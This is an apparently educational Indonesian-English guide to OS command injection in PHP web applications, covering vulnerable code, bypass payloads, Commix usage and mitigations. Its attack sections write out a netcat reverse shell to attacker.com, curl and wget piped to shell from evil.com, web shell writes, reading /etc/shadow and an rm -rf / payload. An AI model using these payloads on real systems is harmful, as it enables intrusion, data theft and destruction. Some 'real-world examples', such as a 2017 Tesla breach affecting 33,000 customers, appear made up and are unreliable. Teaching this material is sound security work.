# Command Injection - OS Command Execution

## 🎯 Apa Itu Command Injection?

**Command Injection** adalah vulnerability dimana attacker dapat execute arbitrary operating system commands melalui web application. Terjadi ketika user input langsung dimasukkan ke dalam system command tanpa proper validation atau escaping.

### Mengapa Disebut "Injection"?
Karena attacker "inject" system commands ke dalam aplikasi yang kemudian dieksekusi oleh operating system.

**Real Impact**: Dari data breach hingga full server compromise.

## 🔬 Cara Kerja Command Injection

### Normal Application Flow
```php
// Ping utility
$ip = $_GET['ip'];
system("ping -c 4 $ip");  // Execute: ping -c 4 [user_input]
```

### Vulnerable Code
```php
// Vulnerable: Direct concatenation
exec("ping -c 4 " . $_GET['ip']);

// Vulnerable: Echo into script
$ip = $_GET['ip'];
`ping -c 4 $ip`;  // Backticks - same as exec()
```

### Attack Injection
**Input**: `127.0.0.1; id`
**Command Execution**:
```bash
ping -c 4 127.0.0.1; id
```

**Result**: Ping Command + Arbitrary Command Execution

### Shell Metacharacters Used
- `;` - Command separator
- `&&` - AND conditional
- `||` - OR conditional
- `|` - Pipe output
- `&` - Background process

## 🏗️ Teknologi Di Balik Command Injection

### OS Shell Interface
- **sh/bash/zsh:** Command interpreters
- **exec()/system()/passthru():** PHP functions untuk OS commands
- **Process Creation:** fork() + exec() system calls
- **Execution Context:** Webserver process (usually www-data/apache)

### PHP-to-OS Bridge
```php
// Vulnerable functions
system($cmd);     // Execute dan return output
exec($cmd);       // Execute, return last line
passthru($cmd);   // Execute, direct output passthrough
shell_exec($cmd); // Execute, return full output
```

### Process Execution Lifecycle
1. **Input Processing:** user input → PHP variable
2. **Command Building:** String concatenation
3. **System Call:** PHP → execvp() → fork() → child process
4. **Execution:** OS shell interpret dan run commands
5. **Output Capture:** Send result back ke aplikasi

### Common Target Functions
- **Network Utilities:** ping, traceroute, dig
- **File Operations:** cp, mv, cat, find
- **System Info:** uname, whoami, id, hostname
- **Network Services:** curl, wget, nc

## 📊 Tipe-Tipe Command Injection

### Basic Command Injection (LOW)
```
; whoami             # Simple command
& date               # Background AND
| head               # Pipe chain
```

### Filtered Bypass (MEDIUM)
```
ping+127.0.0.1+&&+rm+-rf+/  # Plus encoding
ping%20127.0.0.1;%0aid       # URL encoding
ping 127.0.0.1; $(id)        # Command substitution
```

### Contextual Bypass (HIGH)
```bash
# If quotes filtered
ping 127.0.0.1 $(whoami)     # Quote-free injection

# If space filtered
ping{127.0.0.1}{;}rm         # Brace expansion
{ping,127.0.0.1,\;,whoami}   # Advanced braces
```

### Time-Based Blind Injection
```
sleep 5 && echo "vulnerable"  # Blind detection
timeout 10s sh -c 'sleep 5'   # Timeout evasion
```

## 🛠️ Testing Serangan Command Injection

### Detection Phase
1. **Single Quote Test:** `' -> Error indicates injection point`
2. **Double Pipe Test:** `|| id -> If command executes`
3. **Ampersand Test:** `& id -> Background execution`
4. **Semicolon Test:** `; id -> Multiple commands`

### Exploitation Phase
#### Information Gathering
```bash
; whoami                      # Current user
; uname -a                    # Kernel info
; cat /etc/passwd             # System users
; pwd                         # Current directory
; ls -la                      # Directory listing
```

#### Network Enumeration
```bash
; netstat -tuln               # Open ports
; ifconfig; arp -a            # Network config
; route -n                    # Routing table
```

#### File System Access
```bash
; find / -name "*.config" 2>/dev/null  # Config files
; cat /etc/shadow                 # Password hashes
; ls -la /home/*                  # User directories
```

### Automated Testing Tools

#### Commix (Command Injection Exploiter)
```bash
# Basic detection
python commix.py -u "http://target.com/page.php?cmd=ls"

# POST data injection
python commix.py -u "http://target.com/login.php" \
  --data="user=admin&pass=test&submit=Login"

# Advanced enumeration
python commix.py -u "target.php?cmd=test" --all
```

#### Burp Suite Integration
1. **Intruder:** Command injection wordlists
2. **Repeater:** Manual payload testing
3. **Macro:** Authenticated session testing

### Web Shell Upload
```bash
# Reverse shell via command injection
; nc -e /bin/bash attacker.com 4444

# Web shell upload
; echo '<?php system($_GET["cmd"]); ?>' > /var/www/shell.php

# Base64 encoded payload
; echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ | base64 -d > webshell.php
```

## 🛡️ Prevention & Mitigation

### Input Sanitization
```php
// Escape shell arguments
$cmd = escapeshellarg($_GET['ip']);
system("ping -c 4 $cmd");

// Escape shell command
$arg = escapeshellcmd($_GET['ip']);
exec("ping -c 4 $arg");
```

### Whitelist Validation
```php
// IP address validation
function validate_ip($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP)) {
        return escapeshellarg($ip);
    }
    return false;
}

$safe_ip = validate_ip($_GET['ip']);
if (!$safe_ip) die("Invalid IP");
system("ping -c 4 $safe_ip");
```

### Executive Function Replacement
```php
// Avoid os.system() in Python
import subprocess

# Safe approach
subprocess.run(['ping', '-c', '4', ip_var], check=True)

# Very safe - array parameters
subprocess.run(['nslookup', ip_var], capture_output=True)
```

### Disable Dangerous Functions
```php
// php.ini
disable_functions = system, exec, passthru, shell_exec, proc_open, popen
```

### Web Application Firewalls
- **ModSecurity:** Command injection rules
- **Cloudflare WAF:** Shell metacharacter blocking
- **AWS WAF:** Managed command injection protection

## 🔍 Real-World Examples

### 2017: Tesla Hack
- Command injection via WiFi registration portal
- Attacker gained SSH access ke Tesla servers
- 33,000 affected customers

### 2018: Barracuda Email Breach
- Command injection in configuration interface
- Remote code execution
- Affected thousands of organizations

### 2020: Atlassian Bitbucket
- Command injection in Mercurial repositories
- Arbitrary code execution
- Multiple CVEs assigned

## 📈 Advanced Command Injection

### Multiline Injection
```
; echo 'multi'; echo 'line'; echo 'command' --
```

### Nested Injection
```bash
; $(curl http://evil.com/shell.sh | bash)
; `wget -q -O- evil.com/script.sh | sh`
```

### Environment Manipulation
```bash
; export PATH=/bin:/usr/bin:/evil/path; whoami
; HOME=/tmp; $(malicious_command)
```

### Chained Exploitation
1. **Read File:** `cat /etc/passwd`
2. **Write WebShell:** `echo "<?php @eval(\$_POST['cmd']); ?>" > /var/www/shell.php`
3. **Execute Commands:** Now have persistent access

## 🎯 Testing Frameworks

### Systematic Testing Process
1. **Input Vector Mapping:** Identify semua user inputs
2. **Context Awareness:** Know the expected command syntax
3. **Character Testing:** Test metacharacters systematically
4. **Filter Recognition:** Identify WAFs dan sanitization
5. **Payload Crafting:** Build based on filter analysis

### Reporting Template
```
# Vulnerability: Command Injection
# URL: http://target.com/utility.php?ip=127.0.0.1
# Parameter: ip
# Payload: 127.0.0.1; id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
# Impact: OS command execution as webserver user
# CVSS: 9.8 (Critical)
# Fix: Input validation + exec whitelist
```

### Automation Checklist
- [ ] Test all user inputs for injection
- [ ] Bypass WAF encodings if present
- [ ] Establish persistent access method
- [ ] Document privilege level capabilities
- [ ] Propose secure alternative implementations

## 📚 Learning Resources

- **OWASP Command Injection:** https://owasp.org/www-community/attacks/Command_Injection
- **Commix Toolkit:** https://github.com/commixproject/commix
- **PayloadAllTheThings:** Command injection payloads
- **Exploit-DB:** Real-world command injection exploits

---

**Command Injection adalah server-side code execution vulnerability yang powerful.** Dari information disclosure hingga full compromise, impactnya besar. Prevention requires secure coding practices dan input validation yang ketat. 🖥️🔥
